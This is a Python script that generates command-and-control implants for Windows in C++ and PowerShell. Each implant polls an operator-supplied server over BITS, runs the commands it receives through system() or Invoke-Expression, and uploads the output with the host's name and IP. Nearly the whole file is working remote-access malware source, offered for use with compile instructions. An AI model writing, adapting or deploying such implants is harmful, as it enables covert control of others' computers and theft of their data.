import os
from colorama import Fore, Style, init

# Initialize colorama
init(strip=False, autoreset=True)

def gen(lang):
    ip = input("[implant] Specify the IP of the server to call back to: ")
    s_time = input("[implant] How long would you like the implant to sleep (seconds): ")
    out_file = input("[implant] What would you like to name your implant (extension will be added): ")
    agentname = input("[implant] What would you like to name the implant (must be a unique identifier): ")

    if lang == "cpp":
        c_code = f'''
#include <windows.h>
#include <bits.h>
#include <filesystem>
#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <iomanip>
#include <shlwapi.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shlwapi.lib")

namespace fs = std::filesystem;

#define COMMAND_URL L"http://{ip}/commands/{agentname}.json"
#define UPLOAD_URL L"http://{ip}/uploads/{agentname}_response.txt"
#define NOTIFY_URL L"http://{ip}/notify.txt"

std::string get_local_command_file()
{{
    return fs::temp_directory_path().string() + "{agentname}.json";
}}

std::string get_local_result_file()
{{
    return fs::temp_directory_path().string() + "{agentname}_response.txt";
}}

std::wstring get_local_command_file_wstring()
{{
    return std::wstring(fs::temp_directory_path().wstring() + L"{agentname}.json");
}}

std::wstring get_local_result_file_wstring()
{{
    return std::wstring(fs::temp_directory_path().wstring() + L"{agentname}_response.txt");
}}

std::string extractCommandFromJson(const std::string& json) {{
    size_t start = json.find("\\"command\\"");
    if (start == std::string::npos) {{
        return "";
    }}
    start = json.find(":", start);
    if (start == std::string::npos) {{
        return "";
    }}
    start = json.find("\\"", start) + 1;
    size_t end = json.find("\\"", start);
    if (start == std::string::npos || end == std::string::npos) {{
        return "";
    }}
    return json.substr(start, end - start);
}}

std::string readCommandFromFile(const std::string& filePath) {{
    std::ifstream file(filePath);
    if (!file.is_open()) {{
        return "";
    }}
    std::string jsonContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    return extractCommandFromJson(jsonContent);
}}

std::string getHostname() {{
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    return std::string(hostname);
}}

std::string getIPAddress() {{
    std::string ip = "Unknown";
    char buffer[1024];
    FILE* pipe = _popen("ipconfig | findstr IPv4", "r");
    if (pipe) {{
        while (fgets(buffer, sizeof(buffer), pipe)) {{
            std::string line(buffer);
            size_t pos = line.find("IPv4 Address");
            if (pos != std::string::npos) {{
                pos = line.find(":") + 2;
                ip = line.substr(pos);
                ip.erase(ip.find_last_not_of(" \n\r\t") + 1);
                break;
            }}
        }}
        _pclose(pipe);
    }}
    return ip;
}}

HRESULT InitializeCOM() {{
    return CoInitializeEx(NULL, COINIT_MULTITHREADED);
}}

HRESULT CreateBITSManager(IBackgroundCopyManager** pManager) {{
    return CoCreateInstance(__uuidof(BackgroundCopyManager), NULL, CLSCTX_LOCAL_SERVER,
                            __uuidof(IBackgroundCopyManager), (void**)pManager);
}}

HRESULT DownloadFile(IBackgroundCopyManager* pManager) {{
    IBackgroundCopyJob* pJob = NULL;
    GUID jobId;
    HRESULT hr = pManager->CreateJob(L"DownloadJob", BG_JOB_TYPE_DOWNLOAD, &jobId, &pJob);
    if (SUCCEEDED(hr)) {{
        std::wstring localCommandFile = get_local_command_file_wstring();
        hr = pJob->AddFile(COMMAND_URL, localCommandFile.c_str());
        if (SUCCEEDED(hr)) {{
            pJob->Resume();
        }} else {{
            pJob->Release();
            return hr;
        }}
        BG_JOB_STATE state;
        do {{
            Sleep(1000);
            pJob->GetState(&state);
        }} while (state == BG_JOB_STATE_TRANSFERRING || state == BG_JOB_STATE_QUEUED);
        if (state == BG_JOB_STATE_TRANSFERRED) {{
            hr = pJob->Complete();
        }} else {{
            hr = E_FAIL;
        }}
        pJob->Release();
    }}
    return hr;
}}

HRESULT UploadFile(IBackgroundCopyManager* pManager, const std::wstring& uploadUrl, const std::wstring& localFile) {{
    IBackgroundCopyJob* pJob = NULL;
    GUID jobId;
    HRESULT hr = pManager->CreateJob(L"UploadJob", BG_JOB_TYPE_UPLOAD, &jobId, &pJob);
    if (SUCCEEDED(hr)) {{
        hr = pJob->AddFile(uploadUrl.c_str(), localFile.c_str());
        if (FAILED(hr)) {{
            pJob->Release();
            return hr;
        }}
        hr = pJob->Resume();
        if (FAILED(hr)) {{
            pJob->Release();
            return hr;
        }}
        BG_JOB_STATE state;
        do {{
            Sleep(1000);
            pJob->GetState(&state);
        }} while (state == BG_JOB_STATE_TRANSFERRING || state == BG_JOB_STATE_QUEUED);
        if (state == BG_JOB_STATE_TRANSFERRED) {{
            hr = pJob->Complete();
        }}
        pJob->Release();
    }}
    return hr;
}}

void executeCommand(const std::string& command) {{
    if (command.empty()) {{
        return;
    }}
    std::string resultFile = get_local_result_file();
    std::string hostname = getHostname();
    std::string ip = getIPAddress();
    std::string fullCommand = command + " > " + resultFile + " 2>&1";
    int returnCode = system(fullCommand.c_str());
    std::string tempFile = resultFile + ".tmp";
    std::ofstream outFile(tempFile);
    outFile << hostname << "\\n" << ip << "\\n";
    std::ifstream inFile(resultFile);
    if (inFile.is_open() && outFile.is_open()) {{
        outFile << inFile.rdbuf();
        inFile.close();
        outFile.close();
        std::remove(resultFile.c_str());
        std::rename(tempFile.c_str(), resultFile.c_str());
    }}
}}

int main() {{
    std::string identifier = "{agentname}";
    HRESULT hr = InitializeCOM();
    if (FAILED(hr)) {{
        return 1;
    }}
    IBackgroundCopyManager* pManager = NULL;
    hr = CreateBITSManager(&pManager);
    if (FAILED(hr)) {{
        CoUninitialize();
        return 1;
    }}
    std::ofstream notifyFile("{agentname}_notify.txt");
    if (notifyFile.is_open()) {{
        notifyFile << "identifier={agentname}";
        notifyFile.close();
        UploadFile(pManager, NOTIFY_URL, L"{agentname}_notify.txt");
        std::remove("{agentname}_notify.txt");
    }}
    while (true) {{
        if (SUCCEEDED(DownloadFile(pManager))) {{
            std::string command = readCommandFromFile(get_local_command_file());
            executeCommand(command);
            UploadFile(pManager, UPLOAD_URL, get_local_result_file_wstring());
        }}
        if (pManager) {{
            pManager->Release();
        }}
        CoUninitialize();
        Sleep({s_time} * 1000);
        hr = InitializeCOM();
        if (FAILED(hr)) {{
            return 1;
        }}
        hr = CreateBITSManager(&pManager);
        if (FAILED(hr)) {{
            CoUninitialize();
            return 1;
        }}
    }}
    return 0;
}}
'''
        os.makedirs("./implants", exist_ok=True)
        with open(f"./implants/{out_file}.cpp", "w", encoding="utf-8") as f:
            f.write(c_code)
        print(f"{Fore.GREEN}[+] Implant has been generated and saved to: ./implants/{out_file}.cpp{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Compile on Windows with 'g++ -o {out_file}.exe {out_file}.cpp -lole32 -lws2_32 -lruntimeobject -luuid -lwinhttp -lshlwapi'{Style.RESET_ALL}")

    elif lang == "ps1":
        ps1_code = f'''
$command_url = "http://{ip}/commands/{agentname}.json"
$upload_url = "http://{ip}/uploads/{agentname}_response.txt"
$notify_url = "http://{ip}/uploads/notify.txt"
$local_command_file = "$Env:temp\\{agentname}.json"
$local_result_file = "$Env:temp\\{agentname}_response.txt"
$agentname = "{agentname}"

function Notify-Server {{
    try {{
        "identifier=$agentname" | Out-File -FilePath $Env:TEMP\\{agentname}_notify.txt -Encoding utf8
        Start-BitsTransfer -Source $Env:TEMP\\{agentname}_notify.txt -Destination $notify_url -TransferType Upload -ErrorAction Stop
        Remove-Item $Env:TEMP\\{agentname}_notify.txt -Force
    }} catch {{
        Write-Error "Failed to notify server: $_"
    }}
}}

function Download-Command {{
    try {{
        Start-BitsTransfer -Source $command_url -Destination $local_command_file -ErrorAction Stop
    }} catch {{
        Write-Error "Failed to download command file: $_"
    }}
}}

function Execute-Commands {{
    if (Test-Path $local_command_file) {{
        $json = Get-Content $local_command_file | ConvertFrom-Json
        if ($json.commands -and $json.commands.Count -gt 0) {{
            $allResults = @()
            foreach ($cmd in $json.commands) {{
                try {{
                    $result = Invoke-Expression $cmd 2>&1
                }} catch {{
                    $result = "Command '$cmd' failed: $_"
                }}
                $entry = "$($env:COMPUTERNAME)`n$((Get-NetIPAddress -AddressFamily IPv4 | Where-Object {{ $_.InterfaceAlias -notlike '*Loopback*' }} | Select-Object -First 1).IPAddress)`nCommand: $cmd`nResult:`n$result"
                $allResults += $entry
            }}

            $allResults -join "`n`n" | Out-File -FilePath $local_result_file -Encoding utf8
            $json.commands = @()  # Clear all commands after execution
            $json | ConvertTo-Json -Depth 2 | Out-File -FilePath $local_command_file -Encoding utf8
        }}
    }}
}}


function Upload-Result {{
    if (Test-Path $local_result_file) {{
        try {{
            Start-BitsTransfer -Source $local_result_file -Destination $upload_url -TransferType Upload -ErrorAction Stop
            Remove-Item -Path $local_result_file -Force
        }} catch {{
            Write-Error "Failed to upload result: $_"
        }}
    }}
}}

function Main {{
    Notify-Server
    while ($true) {{
        Download-Command
        Execute-Commands
        Upload-Result
        Remove-Item $local_command_file -ErrorAction SilentlyContinue
        Start-Sleep -Seconds {s_time}
    }}
}}

Main
'''

        os.makedirs("./implants", exist_ok=True)
        with open(f"./implants/{out_file}.ps1", "w", encoding="utf-8") as f:
            f.write(ps1_code)
        print(f"{Fore.GREEN}[+] Implant has been generated and saved to: ./implants/{out_file}.ps1{Style.RESET_ALL}")